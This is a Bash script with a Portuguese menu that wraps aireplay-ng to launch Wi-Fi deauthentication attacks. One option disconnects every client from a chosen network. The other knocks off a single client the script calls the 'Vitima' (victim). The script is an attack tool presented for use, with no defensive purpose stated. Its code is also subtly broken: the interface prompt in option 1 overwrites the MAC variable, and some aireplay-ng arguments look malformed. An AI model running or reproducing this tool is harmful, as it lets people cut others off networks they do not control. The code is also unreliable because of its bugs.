#! /bin/bash

cyan='\e[0;36m'
green='\e[0;32m'
lightgreen='\e[0;32m'
white='\e[0;37m'
red='\e[0;31m'
yellow='\e[0;33m'
blue='\e[0;34m'
purple='\e[0;35m'
orange='\e[38;5;166m'

function logo {
echo -e $blue  "           oooooooooo oo     oo ooooooooo ooooooooo  "
echo -e $blue  "           oooooooooo oo     oo ooooooooo ooooooooo "
echo -e $blue  "               oo     oo     oo o     ooo oo     oo "
echo -e $blue  "               oo     oo     oo o      oo oo     oo "
echo -e $blue  "               oo     oo     oo o     ooo oo     oo "
echo -e $blue  "               oo     ooooooooo ooooooooo ooooooooo "
echo -e $blue  "               oo     ooooooooo ooooooooo ooooooooo "
echo -e $blue  "                                                "
echo -e $blue  "            ss             ss  ss       ssssssss  ss "
echo -e $blue  "             ss           ss   ss       ss        ss "
echo -e $blue  "             ss           ss   ss       ss        ss "
echo -e $blue  "             ss   ssss    ss   ss  sss  ssssssss  ss "
echo -e $blue  "              ss  ss ss  ss    ss       ss        ss "
echo -e $blue  "               ss ss ss ss     ss       ss        ss "
echo -e $blue  "                ss     ss      ss       ss        ss "
echo -e $blue  "                                                     "
echo -e $blue  "                                                          EMAIL:casteloabraao@gmail.com"

echo -e $purple "Carregando..."
sleep 5
}
reset
logo
terminal="Tudowi-fi :# "
sleep 5
echo -e $blue "|--------------------------------------------------------------------|"
echo -e $blue "|                                                                    |"
echo -e $blue "|              Entre com 1 para Desconectar toda rede                |"
echo -e $blue "|             Entre com 2 para Desconctar um Cliente                 |"
echo -e $blue "|                                                                    |"
echo -e $blue "|--------------------------------------------------------------------|"
printf "\n"

read -p "$terminal" x
printf "\n"
if [ "$x" = "1" ]
then
echo -e $yellow "|---------------------------------------------------------------- ---|"
echo -e $yellow "|               Por favor enter com o MAC da rede                    |"
echo -e $yellow "|--------------------------------------------------------------------|"
printf "\n"
mac=$(whiptail --title "Endereço MAC" --inputbox "Enter com o MAC da rede: " --fb 10 60 3>&1 1>&2 2>&3)
printf "\n"
echo "$terminal $mac "
printf "\n"
mac=$(whiptail --title "Interface" --inputbox "Enter Interface em M. Monitor: " --fb 10 60 3>&1 1>&2 2>&3)
printf "\n"
echo "$terminal $iface "
printf "\n"
sleep 3
aireplay-ng -0 10000 -a $mac -i $iface
fi

if [ "$x" = "2" ]

then
echo -e $yellow "|---------------------------------------------------------------- ---|"
echo -e $yellow "|               Por favor enter com o MAC da rede                    |"
echo -e $yellow "|--------------------------------------------------------------------|"
printf "\n"
mac=$(whiptail --title "Endereço MAC" --inputbox "Enter com o MAC da rede: " --fb 10 60 3>&1 1>&2 2>&3)
printf "\n"
echo "$terminal MAC rede: $mac "
printf "\n"
echo -e $yellow "|---------------------------------------------------------------- ---|"
echo -e $yellow "|               Por favor enter com o MAC da Vitima                  |"
echo -e $yellow "|--------------------------------------------------------------------|"
printf "\n"
macv=$(whiptail --title "Endereço MAC" --inputbox "Enter com o MAC da rede: " --fb 10 60 3>&1 1>&2 2>&3)
printf "\n"
echo "$terminal MAC da Vitima: $macv "
printf "\n"
echo -e $yellow "|---------------------------------------------------------------- ---|"
echo -e $yellow "|               Por favor enter com a interface                      |"
echo -e $yellow "|--------------------------------------------------------------------|"
printf "\n"
read -p "$terminal" iface2
printf "\n"
aireplay-ng --deauth 0 1000 -a $mac -c $macv  $iface2
sleep 4
else
echo "Paramentro Incorreto"
fi

